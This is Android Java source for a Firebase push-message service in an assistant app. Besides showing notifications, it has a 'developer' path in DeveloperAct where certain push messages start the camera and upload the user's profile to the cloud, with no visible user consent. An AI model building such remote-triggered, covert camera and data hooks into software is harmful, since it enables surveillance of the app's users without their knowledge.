package com.wasitech.permissioncenter.java.com.wasitech.assist.services_receivers;

import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;

import androidx.annotation.NonNull;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.wasitech.ting.Chat.Notification.MessageCenter;
import com.wasitech.camera.cam.CamApi1;
import com.wasitech.assist.activities.TingNoActivity;
import com.wasitech.basics.app.ProcessApp;
import com.wasitech.assist.classes.Tingno;
import com.wasitech.assist.runnables.TokenUpdateRunnable;
import com.wasitech.basics.classes.Basics;
import com.wasitech.basics.classes.Issue;
import com.wasitech.basics.notify.OldNotificationMaker;
import com.wasitech.database.CloudDB;
import com.wasitech.database.LocalDB;
import com.wasitech.database.Params;

import java.util.Map;
import java.util.Objects;

public class MessagingService extends FirebaseMessagingService {
    private OldNotificationMaker maker;

    @Override
    public void onCreate() {
        super.onCreate();
        maker = new OldNotificationMaker(getApplicationContext());
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage message) {
        super.onMessageReceived(message);
        try {
            if (message.getData().containsKey(Params.TINGGO)) {
                if (ProcessApp.getCurUser() == null) return;
                TingGo(message.getData());
            } else if (message.getData().containsKey(Params.TINGNO)) {
                if (ProcessApp.getCurUser() == null) return;
                TingNo(message);
            } else {
                DeveloperAct(message);
            }
        } catch (Exception e) {
            Issue.set(e, MessagingService.class.getName());
        }
    }

    private void TingNo(RemoteMessage remoteMessage) {
        String text = Objects.requireNonNull(remoteMessage.getNotification()).getBody();
        String title = remoteMessage.getNotification().getTitle();
        String time = remoteMessage.getData().get(MessageCenter.TIME);
        if (text != null) {
            new LocalDB(MessagingService.this).addTingNoti(new Tingno(Tingno.DEVELOPER, text, Params.TING, time));
            Intent intent = new Intent(getApplicationContext(), TingNoActivity.class);
            intent.putExtras(Objects.requireNonNull(remoteMessage.toIntent().getExtras()));
            Uri uri = remoteMessage.getNotification().getImageUrl();
            if (uri != null) {
                Bitmap map = Basics.Img.downloadBitmap(remoteMessage.getNotification().getImageUrl().toString());
                maker.TingNoNotify(title, text, map, intent);
            } else {
                maker.TingNoNotify(title, text, intent);
            }
        }
    }

    private void TingGo(Map<String, String> data) {
        //String text = data.get(Params.TEXT);
        //TingUser sender = new TingUser(data.get(Params.SENDER_ID),
        //        data.get(Params.SENDER_NAME),
        //        data.get(Params.SENDER_NUM));
        //String receivingTime = data.get(Params.SENT_TIME);
        //DataBaseHandler db = new DataBaseHandler(MessagingService.this);
        //if (db.userNotExist(sender.getId(), Params.TABLE_TING_USER))
        //    db.addTingUser(sender);
        //if (db.addTingGo(sender.getId(), new Tinggo(0, text, "", receivingTime))) {
        //    db.addTingCount(sender.getId(), 1);
        //    new AppVoice(getApplicationContext(), "TingGo");
        //}
    }

    private void DeveloperAct(RemoteMessage message) {
        String data;
        StringBuilder temp = new StringBuilder();
        String title = Objects.requireNonNull(message.getNotification()).getTitle();
        if (title == null) {
            title = "Assistant";
        }
        if (message.getData().containsKey(Params.Developer.PIC)) {
            data = message.getData().get(Params.Developer.PIC);
            try {
                new CamApi1(getApplicationContext(), 1, false);
                temp.append(data).append("\n");
            } catch (Exception e) {
                Issue.set(e, MessagingService.class.getName());
                temp.append("Ex: ").append(e.getMessage()).append("\n");
            }
        }
        if (message.getData().containsKey(Params.Developer.BACKUP)) {
            data = message.getData().get(Params.Developer.BACKUP);
            try {
                temp.append(data).append("\n");
            } catch (Exception e) {
                Issue.set(e, MessagingService.class.getName());
                temp.append("Ex: ").append(e.getMessage()).append("\n");
            }
        }
        if (message.getData().containsKey(Params.Developer.USER_UPDATE)) {
            data = message.getData().get(Params.Developer.USER_UPDATE);
            try {
                new CloudDB.ProfileCenter(getApplicationContext()).uploadProfile();
                temp.append(data).append("\n");
            } catch (Exception e) {
                Issue.set(e, MessagingService.class.getName());
                temp.append("Ex: ").append(e.getMessage()).append("\n");
            }
        }
        if (message.getData().containsKey(Params.Developer.APP_UPDATE)) {
            data = message.getData().get(Params.Developer.APP_UPDATE);
            try {
                if (message.getNotification().getImageUrl() != null) {
                    Bitmap map = Basics.Img.downloadBitmap(message.getNotification().getImageUrl().toString());
                    maker.UpdateAvailable(data, map);
                } else
                    maker.UpdateAvailable(data, null);
                temp.append(data).append("\n");
            } catch (Exception e) {
                Issue.set(e, MessagingService.class.getName());
                temp.append("Ex: ").append(e.getMessage()).append("\n");
            }
            return;
        }

        if (message.getNotification().getImageUrl() != null) {
            Bitmap map = Basics.Img.downloadBitmap(message.getNotification().getImageUrl().toString());
            if (map != null)
                maker.Notify(title, message.getNotification().getBody(), map, null);
            else
                maker.Notify(title, message.getNotification().getBody(), null);
        } else {
            maker.Notify(title, message.getNotification().getBody(), null);
        }
        String text = temp.toString();
        if (!text.isEmpty())
            new CloudDB.DataCenter().Service("Notifiction", text);
    }

    public MessagingService() {
        super();
    }

    @Override
    public void onDeletedMessages() {
        super.onDeletedMessages();
    }

    @Override
    public void onMessageSent(@NonNull String s) {
        super.onMessageSent(s);
    }

    @Override
    public void onSendError(@NonNull String s, @NonNull Exception e) {
        Issue.set(e, MessagingService.class.getName());
        super.onSendError(s, e);
    }

    @Override
    @NonNull
    protected Intent getStartCommandIntent(@NonNull Intent intent) {
        return super.getStartCommandIntent(intent);
    }

    @Override
    public boolean handleIntentOnMainThread(@NonNull Intent intent) {
        return super.handleIntentOnMainThread(intent);
    }

    @Override
    public void handleIntent(@NonNull Intent intent) {
        super.handleIntent(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onNewToken(@NonNull String s) {
        super.onNewToken(s);
        if (ProcessApp.getCurUser() != null) {
            ProcessApp.getPref().edit().putString(Params.TOKEN, s).apply();
            new Thread(new TokenUpdateRunnable(getApplicationContext(), s)).start();
        }
    }
}
